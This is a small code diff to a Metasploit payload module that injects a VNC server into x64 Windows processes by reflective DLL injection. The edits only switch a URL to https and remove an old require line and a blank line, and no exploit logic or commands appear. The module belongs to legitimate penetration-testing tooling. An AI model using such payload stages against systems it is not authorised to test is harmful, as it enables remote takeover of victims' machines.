@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/windows/x64/reflectivedllinject'
 require 'msf/base/sessions/vncinject'
 require 'msf/base/sessions/vncinject_options'
@@ -30,5 +29,4 @@ module MetasploitModule
   def library_path
     File.join(Msf::Config.data_directory, "vncdll.x64.dll")
   end
-
 end
